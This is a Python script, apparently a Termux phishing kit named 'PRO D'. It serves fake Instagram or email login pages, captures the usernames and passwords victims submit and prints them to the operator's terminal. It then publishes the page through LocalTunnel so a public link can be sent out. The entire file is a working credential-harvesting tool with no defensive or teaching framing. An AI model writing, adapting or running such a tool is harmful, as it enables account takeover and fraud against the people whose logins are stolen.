import os
import sys
import socket
import subprocess
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# -------- Colors --------
red = '\033[1;31m'
grn = '\033[1;32m'
ylo = '\033[1;33m'
cyan = '\033[1;36m'
pink = '\033[1;35m'
reset = '\033[0m'

# -------- Auto-install dependencies --------
def install_dependencies():
    os.system("clear")
    print(f"{cyan}Checking dependencies...{reset}")
    # Python packages
    try:
        import requests
    except ModuleNotFoundError:
        print(f"{ylo}Installing requests...{reset}")
        os.system(f"{sys.executable} -m pip install requests")

    # Node.js + localtunnel
    if os.system("node -v") != 0:
        print(f"{ylo}Installing Node.js...{reset}")
        os.system("pkg install -y nodejs")
    if os.system("lt -v") != 0:
        print(f"{ylo}Installing LocalTunnel...{reset}")
        os.system("npm install -g localtunnel")
    print(f"{grn}All dependencies installed!{reset}\n")

# -------- Banner --------
def banner():
    os.system("clear")
    print(f"""{red}
 ____  ____   ___    ____  
|  _ \\|  _ \\ / _ \\  |  _ \\ 
| |_) | |_) | | | | | | | |
|  __/|  _ <| |_| | | |_| |
|_|   |_| \\_\\\\___/  |____/ 

{cyan}            PRO D
{pink}         Created by Dhani v1.0{reset}
""")

# -------- HTML Pages --------
html_pages = {
    "1": "11.html",  # Instagram
    "2": "2.html"    # Email
}

# -------- HTTP Request Handler --------
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        file_name = html_pages.get(selected_choice, "11.html")
        try:
            with open(file_name, "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"File not found!")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = parse_qs(post_data.decode())
        username = data.get("username", [""])[0]
        password = data.get("password", [""])[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Username: {ylo}{username}{cyan}            
║ {cyan}Password: {ylo}{password}{cyan}            
║ {cyan}Time    : {ylo}{timestamp}{cyan} 
╚══════════════════════════════╝{reset}
""")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Login received! Check terminal.")

# -------- Find free port --------
def get_free_port(start_port=8080):
    port = start_port
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1

# -------- Run Server --------
def run_server():
    port = get_free_port(8080)
    server = HTTPServer(("0.0.0.0", port), RequestHandler)
    print(f"{grn}Server running on http://127.0.0.1:{port}{reset}")
    
    # Start localtunnel and get public URL
    print(f"{cyan}Starting LocalTunnel...{reset}")
    try:
        lt_process = subprocess.Popen(
            ["lt", "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        # Read line by line to print public URL
        while True:
            output = lt_process.stdout.readline()
            if output:
                print(f"{grn}{output.strip()}{reset}")
            if "url:" in output:
                print(f"{pink}Public link is above!{reset}\n")
            if lt_process.poll() is not None:
                break
    except Exception as e:
        print(f"{red}Error starting LocalTunnel: {e}{reset}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"{ylo}\nServer stopped.{reset}")

# -------- Main --------
if __name__ == "__main__":
    install_dependencies()
    banner()

    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Choose Page Template{pink}        
╠══════════════════════════════╣
║ [1] Instagram                
║ [2] Email                  
╚══════════════════════════════╝
{reset}""")
    selected_choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    if selected_choice not in ["1", "2"]:
        selected_choice = "1"

    run_server()
